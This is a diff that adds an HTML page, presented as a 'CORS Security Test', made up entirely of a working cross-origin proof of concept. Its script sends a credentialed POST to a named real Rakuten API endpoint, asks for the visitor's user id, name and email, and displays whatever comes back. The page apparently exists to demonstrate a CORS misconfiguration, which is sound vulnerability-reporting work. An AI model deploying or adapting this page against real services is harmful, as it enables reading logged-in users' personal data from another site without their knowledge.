@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Security Test</title>
+</head>
+<body>
+    <center>
+        <h2>CORS Security Test</h2> 
+        <h3>Check for Misconfigured CORS Policies</h3>
+        <div id="demo">
+            <button type="button" onclick="testCORS()">Test CORS</button>
+        </div>
+    </center>
+
+    <script>
+        function testCORS() {
+            var xhttp = new XMLHttpRequest();
+            xhttp.onreadystatechange = function() {
+                if (this.readyState === 4) {
+                    if (this.status === 200) {
+                        try {
+                            var response = JSON.parse(this.responseText);
+                            alert("CORS Misconfiguration Detected!\nResponse: " + JSON.stringify(response, null, 2));
+                            document.getElementById("demo").innerHTML = "<pre>" + JSON.stringify(response, null, 2) + "</pre>";
+                        } catch (e) {
+                            alert("CORS Misconfiguration Detected!\nResponse: " + this.responseText);
+                            document.getElementById("demo").innerHTML = "<pre>" + this.responseText + "</pre>";
+                        }
+                    } else {
+                        alert("Request failed with status: " + this.status);
+                    }
+                }
+            };
+
+            xhttp.open("POST", "https://onboarding.mobile.rakuten.co.jp/api/configuration/config", true);
+            xhttp.setRequestHeader("Content-Type", "application/json");
+            xhttp.withCredentials = true;
+
+            var data = JSON.stringify({
+                query: "{ user { id, name, email } }"
+            });
+
+            xhttp.send(data);
+        }
+    </script>
+</body>
+</html>
